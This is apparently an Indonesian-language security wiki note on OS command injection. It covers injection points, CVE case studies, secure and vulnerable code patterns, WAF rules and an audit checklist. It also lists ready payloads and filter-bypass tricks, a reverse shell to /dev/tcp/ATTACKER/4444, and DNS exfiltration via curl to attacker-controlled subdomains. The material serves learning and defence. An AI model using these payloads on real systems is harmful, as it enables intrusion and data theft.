---
title: Command Injection
tags: [security, web, exploitation]
aliases: [command-injection]
---
# Command Injection

Injeksi perintah (OS Command Injection) terjadi saat input user diteruskan ke shell (system(), exec(), backticks, eval pada Python/Node) tanpa sanitasi. Contoh berbahaya: `os.system("ping " + user_input)`, `eval(user_expr)`, `subprocess.run(cmd + user, shell=True)`.

## Injection Points

| Layer | Contoh | Bahasa |
|-------|--------|--------|
| System call | `system()`, `popen()`, `exec()` | C, PHP, Python |
| Shell passthrough | `Runtime.exec()`, `ProcessBuilder` tanpa array | Java |
| Template engine | `{cmd}` di Jinja2/Twig tanpa sandbox | Python, PHP |
| Deserialization | gadget chain → `Runtime.exec` | Java (ysoserial) |
| Cron/API hook | parameter ke `nslookup`, `dig`, `ping` | Aplikasi apapun |

## Payload Dasar

```bash
; id
| id
`id`
$(id)
%0a id
ping 1.2.3.4 -n 1 & whoami
'; cat /etc/passwd #
```

## Bypass Teknik

1. **Encoding** — URL encode (`%20`, `%0a`), double encoding, unicode (`%u0020`).
2. **Whitespace alternatif** — `${IFS}`, tab, `$' '`, `{cat,/etc/passwd}`.
3. **Newline injection** — payload di baris baru setelah parameter valid (`param=ok%0acat%20/etc/passwd`).
4. **Wildcard/glob** — `/???/???t*` untuk mengurangi karakter yang diblokir.
5. **Environment var** — `$PATH`, `$IFS`, `$()` chaining.
6. **Filter bypass** — jika kata "cat" diblokir: `c''at`, `c$@at`, `ct`, `cat`.

## Deteksi & Pencegahan

- **Gunakan API tanpa shell**: `subprocess.run([...])` dengan list argumen, bukan string + `shell=True`.
- **Whitelist input**: hanya izinkan pola yang diharapkan (regex strict, bukan blacklist).
- **Least privilege**: jalankan aplikasi dengan user non-root.
- **WAF**: deteksi pattern `;|&|$()|\`\`` di parameter (CRS rule 932100-932260).
- **Logging**: audit semua eksekusi perintah — deteksi anomali command line (Sysmon Event ID 1, EDR).
- **Secure coding**: hindari shell wrapper ketika API native cukup.

## Red Team Perspective

Command injection sering jadi step: foothold → stable shell. Preferensi: reverse shell `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`, bind shell, atau out-of-band exfil via DNS (`curl http://attacker.collaborator.$(whoami).com`). Tooling: Burp Intruder (payload wordlist), commix (automasi), atau manual dengan netcat.

## Referensi

- OWASP Command Injection Prevention Cheat Sheet
- PayloadsAllTheThings — Command Injection
- PortSwigger Web Security Academy — OS command injection lab



## Studi Kasus Nyata

1. **CVE-2018-7600 (Drupalgeddon2)** — form API memanggil `passthru()` via user input; RCE pada jutaan situs Drupal. Pelajaran: parameterized execution wajib, bahkan di framework populer.
2. **CVE-2021-44228 (Log4Shell)** — JNDI lookup memicu perintah eksternal; bukan command injection klasik tapi dampaknya setara RCE via aplikasi Java.
3. **phpMyAdmin CVE-2016-5734** — parameter `pma_username` diteruskan ke `preg_replace` dengan flag `/e` → evaluasi kode. Pelajaran: fitur "elegant" (regex /e, eval) = permukaan serangan.

## Blind Command Injection (Detection via Out-of-Band)

Ketika output tidak terlihat, gunakan side channel:

```bash
# Time-based
payload=1; sleep 5
# DNS exfil — setiap karakter dikirim sebagai subdomain
curl http://$(hostname).attacker.com
# Collaborator/Interactsh
attacker$ collab: xyz.oastify.com → `nslookup xyz.oastify.com`
```

Tools untuk blind: Burp Collaborator, interactsh (ProjectDiscovery), OAST.

## Command Injection vs Code Injection

| Fitur | Command Injection | Code Injection |
|-------|-------------------|----------------|
| Eksekusi | Shell OS (sh, cmd) | Bahasa aplikasi (PHP eval, Python exec) |
| Payload | `; id`, `$(cat /etc/passwd)` | `system('id')`, `__import__('os').system('id')` |
| Contoh CVE | CVE-2018-7600 | phpMyAdmin preg_replace /e |
| Impact | RCE (sama) | RCE (sama) |

## Defense Code Patterns

```python
# BURUK — shell string concat
cmd = "ping -c 1 " + user_input
os.system(cmd)

# BAIK — list args tanpa shell
import subprocess
subprocess.run(["ping", "-c", "1", user_input], shell=False)

# JAVA
ProcessBuilder("ping", "-c", "1", user_input)  // aman
Runtime.getRuntime().exec("ping -c 1 " + input)  // RENTAN
```

```php
// PHP — aman vs rentan
$out = shell_exec("nslookup " . escapeshellarg($input)); // aman-ish
$out = shell_exec("nslookup " . $input);  // RENTAN
```

## Automation Testing

- **commix** — automasi command injection dengan deteksi waktu/error/out-of-band.
- **Burp Intruder** — payload wordlist: `;id`, `|id`, `$(id)`, `` `id` ``, `%0aid`.
- **Custom fuzzing** — masalah encoding: uji `%00`, `%0a`, UTF-16, double URL-encode.
- **Nuclei template** — template command-injection untuk scan massal.

## Checklist Audit

- [ ] Semua eksekusi OS pakai parameterized/no-shell API?
- [ ] Input user divalidasi whitelist (bukan blacklist)?
- [ ] WAF rule CRS aktif (932xxx) dengan paranoia level sesuai?
- [ ] Blind injection terdeteksi di log (out-of-band DNS)?
- [ ] Aplikasi jalan dengan least privilege?



## Blind Detection Commands (Linux/Windows)

```bash
# Linux — waktu (time-based)
time curl -d "ip=127.0.0.1; sleep 5" http://target/ping
# Windows
ping -n 6 127.0.0.1 & whoami > C:\Windows\Temp\out.txt
# OAST — Burp Collaborator / interactsh
curl http://test.collaborator-domain.com
```

## Common Filter Bypass Table

| Filter | Bypass |
|--------|--------|
| Blokir `;` dan `|` | `$()` / backtick / newline `%0a` |
| Blokir `cat` | `c""at`, `c$@at`, `/bin/c?t`, `tac` (reverse) |
| Blokir spasi | `${IFS}`, `<`, `%09`, `$'\x20'` |
| Blokir `/` | `$(pwd)` + `cd`, `${PWD%/*}` |
| Blokir kata kunci | concat via shell: `wh$(echo oami)` |

## Eksekusi Remediasi / Blue Team

- Batch hunt: cari `system(`, `exec(`, `shell_exec`, `Runtime.getRuntime`, `ProcessBuilder` di codebase (grep/SAST).
- Review khusus: endpoint dengan input numeric/name yang masuk ke command (ping, nslookup, dig, ffmpeg, zip).
- Runtime protection: seccomp/Landlock untuk proses aplikasi, AppArmor profile, container non-root.
- Uji ulang setelah patch: regression test dengan payload dari CVE publik.

---

  audited
---